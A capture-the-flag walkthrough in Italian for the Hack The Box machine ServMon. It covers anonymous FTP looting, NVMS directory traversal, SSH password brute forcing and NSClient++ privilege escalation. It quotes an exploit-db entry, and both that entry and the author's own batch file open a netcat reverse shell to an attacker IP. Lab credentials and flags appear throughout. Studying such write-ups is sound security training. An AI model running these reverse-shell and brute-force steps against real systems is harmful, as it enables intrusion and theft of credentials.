**Target: 10.10.10.184

# INFORMATION GAHTERING

Iniziamo con semplice scan [Nmap](Note/Tool/Nmap.md)

```bash
┌──(root㉿kali)-[/home/kali/htb/servmon]
└─# nmap -sC -sV -O --min-rate=5000 -Pn 10.10.10.184
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-25 15:44 EDT
Nmap scan report for 10.10.10.184
Host is up (0.049s latency).
Not shown: 991 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
| ftp-syst:
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp   open  http
| fingerprint-strings:
|   GetRequest, HTTPOptions, RTSPRequest:
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo:
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL:
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
| http-title: NSClient++
|_Requested resource was /index.html
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
| fingerprint-strings:
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest:
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94%I=7%D=9/25%Time=6511E330%P=x86_64-pc-linux-gnu%r(NULL
SF:,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
SF:20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20X
SF:HTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/D
SF:TD/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.
SF:org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\
SF:x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x2
SF:0\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")
SF:%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
SF:n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\
SF:x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xh
SF:tml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1
SF:999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x
SF:20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20
SF:\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RT
SF:SPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
SF:\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\
SF:.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-
SF:transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/x
SF:html\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x2
SF:0<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\
SF:x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=9/25%Time=6511E338%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\x12\x02\x18\0\x1aC\n\x07workers\x12\n\n\x04jobs\x12\x02\x1
SF:8\x10\x12\x0f")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x
SF:2018\r\n\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.
SF:1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(R
SF:TSPRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocumen
SF:t\x20not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length
SF::\x2018\r\n\r\nDocument\x20not\x20found");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=9/25%OT=21%CT=1%CU=33290%PV=Y%DS=2%DC=I%G=Y%TM=6511E3B
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=110%TI=I%CI=I%II=I%SS=S%TS=
OS:U)SEQ(SP=FE%GCD=1%ISR=10F%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=FF%GCD=1%ISR=1
OS:10%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M53CNW8NNS%O2=M53CNW8NNS%O3=M53CNW8%O
OS:4=M53CNW8NNS%O5=M53CNW8NNS%O6=M53CNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFF
OS:F%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%D
OS:F=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0
OS:%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=
OS:A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=
OS:Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: 12m41s
| smb2-time:
|   date: 2023-09-25T19:59:30
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 137.72 seconds

```

Ricapitolando abbiamo 9 porte aperte

- 21/tcp   open  ftp           Microsoft ftpd
- 22/tcp   open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
- 80/tcp   open  http
- 135/tcp  open  msrpc         Microsoft Windows RPC
- 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
- 445/tcp  open  microsoft-ds?
- 5666/tcp open  tcpwrapped
- 6699/tcp open  napster?
- 8443/tcp open  ssl/https-alt

Siamo davanti ad una macchina Windows

Dallo scan di Nmap salta all'occhio l'accesso in Anonymous in FTP iniziamo da li 

# ENUMERTION

# Port 21

Come detto prima il servizio FTP accetta il login Anonymous 

```bash
┌──(root㉿kali)-[/home/kali/htb/servmon]
└─# ftp anonymous@10.10.10.184
Connected to 10.10.10.184.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49678|)
125 Data connection already open; Transfer starting.
02-28-22  07:35PM       <DIR>          Users
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49679|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM       <DIR>          Nadine
02-28-22  07:37PM       <DIR>          Nathan
226 Transfer complete.

```

Abbiamo due utenti Nadine, che contiene in file `Confidential.txt` che ci scarichiamo

```
ftp> cd Nadine
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49680|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM                  168 Confidential.txt
226 Transfer complete.
ftp> get Confidential.txt
local: Confidential.txt remote: Confidential.txt
229 Entering Extended Passive Mode (|||49682|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************|   168        1.76 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 6 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
168 bytes received in 00:00 (1.75 KiB/s)
```

e l'utente Nathan anche con un file `Notes to do.txt` che ci scarichiamo 

```ftp> cd ..
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49683|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM       <DIR>          Nadine
02-28-22  07:37PM       <DIR>          Nathan
226 Transfer complete.
ftp> cd Nathan
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49684|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM                  182 Notes to do.txt
226 Transfer complete.
ftp> get Notes\ to\ do.txt
local: Notes to do.txt remote: Notes to do.txt
229 Entering Extended Passive Mode (|||49686|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************|   182        4.00 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 4 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
182 bytes received in 00:00 (3.97 KiB/s)
ftp> exit
221 Goodbye.
```

il File `Confidential.txt` 

```bash
┌──(root㉿kali)-[/home/kali/htb/servmon/lootftp]
└─# cat Confidential.txt
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine

```

dice che Nadine ha lasciato un file password.txt sul Desktop e di metterlo in posto sicuro dopo averlo modificato. Sembra promettente.

menter il il file `Note to do.txt`

```bash
┌──(root㉿kali)-[/home/kali/htb/servmon/lootftp]
└─# cat Notes\ to\ do.txt
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint                                               
```

è una lista di cose da fare.  Teniamo a mente quanto trovato.

# Port 80

Visitano la porta 10.10.10.184:80 ci troviamo di fronte ad un from di login NVMS sembra quello di cui si parla nelle note

![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Servmon1.png)

nei  primi due punti dell note che sono stati completati si parla di un cambio password e di un blocco al NSC lato client quindi non penso ci siamo credenziali di default, quindi vediamo se troviamo qualche CVE non su google

il primo risultato della ricerca è questa [CVE](https://www.cvedetails.com/cve/CVE-2019-20085/) dove sembra che questo software si soggetto ad un [Directory Trasversal](../Note/Directory%20Trasversal.md)

Perfetto la nota di Nadine parlava di un file Passwords.txt sul Desktop di Nathan quindi proviamo a leggere quel file tramite la Directory Trasversal

Apriamo [Burp Suite](../Note/Tool/Burp%20Suite.md) e intercettiamo una richiesta alla pagine di login, la mandiamo al repetar,
modifichiamo il metodo di richiesta da POST a GET come segue

![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Servmon2.png)

Ci ritorna delle possibili password

```bash
HTTP/1.1 200 OK 
Content-type: text/plain C
ontent-Length: 156 
Connection: close 
AuthInfo: 


1nsp3ctTh3Way2Mars! 
Th3r34r3To0M4nyTrait0r5! 
B3WithM30r4ga1n5tMe 
L1k3B1gBut7s@W0rk 
0nly7h3y0unGWi11F0l10w 
IfH3s4b0Utg0t0H1sH0me 
Gr4etN3w5w17hMySk1Pa5$
```

Proviamo a romperle con [Hydra](../Hydra.md)

```bash
┌──(root㉿kali)-[/home/kali/htb/servmon]
└─# hydra -L users.txt -P passwords.txt 10.10.10.184 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-25 16:45:39
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 21 login tries (l:3/p:7), ~2 tries per task
[DATA] attacking ssh://10.10.10.184:22/
[22][ssh] host: 10.10.10.184   login: Nadine   password: L1k3B1gBut7s@W0rk
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-25 16:45:46
```

>[!info] possiamo anche trovalo con msfconsole come si vede 
>
```bash
msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE users.txt
USER_FILE => users.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE passwords.txt
PASS_FILE => passwords.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 10.10.10.184
RHOSTS => 10.10.10.184
msf6 auxiliary(scanner/ssh/ssh_login) > run

[*] 10.10.10.184:22 - Starting bruteforce
[+] 10.10.10.184:22 - Success: 'Nadine:L1k3B1gBut7s@W0rk' 'Microsoft Windows [Version 10.0.17763.864]'
[*] SSH session 1 opened (10.10.14.14:45269 -> 10.10.10.184:22) at 2023-09-25 16:38:39 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Abbiamo delle credenziali per ssh :
Nadine:L1k3B1gBut7s@W0rk

```bash
┌──(root㉿kali)-[/home/kali/htb/servmon]
└─# ssh Nadine@10.10.10.184
Nadine@10.10.10.184's password:
Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>dir
 Volume in drive C has no label.
 Volume Serial Number is 20C1-47A1

 Directory of C:\Users\Nadine

02/28/2022  08:04 PM    <DIR>          .
02/28/2022  08:04 PM    <DIR>          ..
02/28/2022  08:04 PM    <DIR>          3D Objects
02/28/2022  08:04 PM    <DIR>          Contacts
02/28/2022  08:05 PM    <DIR>          Desktop
02/28/2022  08:04 PM    <DIR>          Documents
02/28/2022  08:04 PM    <DIR>          Downloads
02/28/2022  08:04 PM    <DIR>          Favorites
02/28/2022  08:04 PM    <DIR>          Links
02/28/2022  08:04 PM    <DIR>          Music
02/28/2022  08:04 PM    <DIR>          Pictures
02/28/2022  08:04 PM    <DIR>          Saved Games
02/28/2022  08:04 PM    <DIR>          Searches
02/28/2022  08:04 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)   6,119,952,384 bytes free

nadine@SERVMON C:\Users\Nadine>
```

e ci prendiamo la nostra user flag

```cmd
nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
a3153c3f55495eb59dad05f64ebf5f43

nadine@SERVMON C:\Users\Nadine\Desktop>
```

# PRIVESC

Dopo un po di enumerazione in Program File troviamo la cartella NSClient++ 

```
```

Dentro ci sono i file di configurazione di NSClient di cui si parlava nella nota di prima
Cercando su internet `NSClinet++ default password` ci rimanda [qui](https://nagiosenterprises.my.site.com/support/s/article/Configuring-NSClient-b82d58d1)

```cmd
nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini
ï»¿# If you want to fill this file with all available options run the following command:
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help


; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1

..<snip>..
```

Possiamo verificare se la password non è stata cambiata con il seguente comando e la versione di NSClient ++

```cmd
nadine@SERVMON C:\Program Files\NSClient++>cmd /c "C:\Program Files\NSClient++\nscp.exe" web -- password --display
Current password: ew2x6SsGTxjRwXOT
nadine@SERVMON C:\Program Files\NSClient++>cmd /c "C:\Program Files\NSClient++\nscp.exe" --version
NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
```

Vediamo se [Searchsploit](../Note/Tool/Searchsploit.md) ci viene in aiuto

```bash
┌──(root㉿kali)-[/home/kali/htb/servmon]
└─# searchsploit NSClient++
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title|  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
NSClient++ 0.5.2.35 - Authenticated Remote Code Execution  | json/webapps/48360.txt
NSClient++ 0.5.2.35 - Privilege Escalation | windows/local/46802.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Scarichiamo e diamo un occhio a 46802.txt

```bash
Exploit Author: bzyo
Twitter: @bzyo_
Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation
Date: 05-05-19
Vulnerable Software: NSClient++ 0.5.2.35
Vendor Homepage: http://nsclient.org/
Version: 0.5.2.35
Software Link: http://nsclient.org/download/
Tested on: Windows 10 x64

Details:
When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.

The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn't seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.

Prerequisites:
To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.

Exploit:
1. Grab web administrator password
- open c:\program files\nsclient++\nsclient.ini
or
- run the following that is instructed when you select forget password
        C:\Program Files\NSClient++>nscp web -- password --display
        Current password: SoSecret

2. Login and enable following modules including enable at startup and save configuration
- CheckExternalScripts
- Scheduler

3. Download nc.exe and evil.bat to c:\temp from attacking machine
        @echo off
        c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe

4. Setup listener on attacking machine
        nc -nlvvp 443

5. Add script foobar to call evil.bat and save settings
- Settings > External Scripts > Scripts
- Add New
        - foobar
                command = c:\temp\evil.bat

6. Add schedulede to call script every 1 minute and save settings
- Settings > Scheduler > Schedules
- Add new
        - foobar
                interval = 1m
                command = foobar

7. Restart the computer and wait for the reverse shell on attacking machine
        nc -nlvvp 443
        listening on [any] 443 ...
        connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
        Microsoft Windows [Version 10.0.17134.753]
        (c) 2018 Microsoft Corporation. All rights reserved.

        C:\Program Files\NSClient++>whoami
        whoami
        nt authority\system

Risk:
The vulnerability allows local attackers to escalate privileges and execute arbitrary code as Local System                                                                                                                                  
```

Perfetto sono istruzioni per la Privesc, proviamole.

Come prima cosa dobbiamo accedere ad 10.10.10.184:8443 ma dalla nostra macchina non riusciamo.
Proviamo con [Tunneling ssh](../Note/Pivoting,%20Tunneling%20and%20Port%20Forwarding.md)

```bash
┌──(root㉿kali)-[/home/kali]
└─# ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
```

Ora posso accedere a https://127.0.0.1:8443/ e accedere con la password:

![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Servmon3.png)

![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Servmon4.png)
Ora seguendo quanto scritto nella exploit

scarichiamo con curl nc.exe (versione 64bit ) nella cartella Temp del target e scriviamo il file .bat

```bash
nadine@SERVMON C:\Temp>dir
 Volume in drive C has no label.
 Volume Serial Number is 20C1-47A1

 Directory of C:\Temp

09/27/2023  11:55 PM    <DIR>          .
09/27/2023  11:55 PM    <DIR>          ..
09/27/2023  11:54 PM            45,272 nc.exe
09/27/2023  11:55 PM                42 pleasesub.bat
               2 File(s)         45,314 bytes
               2 Dir(s)   6,102,278,144 bytes free

nadine@SERVMON C:\Temp>type pleasesub.bat
c:\Temp\nc.exe -e cmd.exe 10.10.14.16 443
```

a questo punto andiamo nell interfaccia web, alla voce setting/external script/
ne aggiungiamo uno e alla voce comando mettiamo il percorso del nostro file.bat

![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Servmon6.png)
non ci resta che salvare nella voce Changes e fare il reload alla voce Control 
>[!info]
>spesso crasha e bisogna riavviare la macchina

ci mettiamo in ascolto con nc 

```bash
┌──(root㉿kali)-[/home/kali/htb/servmon]
└─# nc -lvp 443
listening on [any] 443 ...

```

ci rechiamo alla sezione Queries ed diamo run, e abbiamo la nostra shell
![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Servmon7.png)

e ci prendiamo la nostra root flag

```cmd
┌──(root㉿kali)-[/home/kali/htb/servmon]
└─# nc -lvp 443
listening on [any] 443 ...
10.10.10.184: inverse host lookup failed: Unknown host
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.184] 50138
Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
whoami
nt authority\system

C:\Program Files\NSClient++>type C:\\Users\\Administrator\\Desktop\\root.txt
type C:\\Users\\Administrator\\Desktop\\root.txt
d8daf71e0c150eea5f8d86073c17a526
```

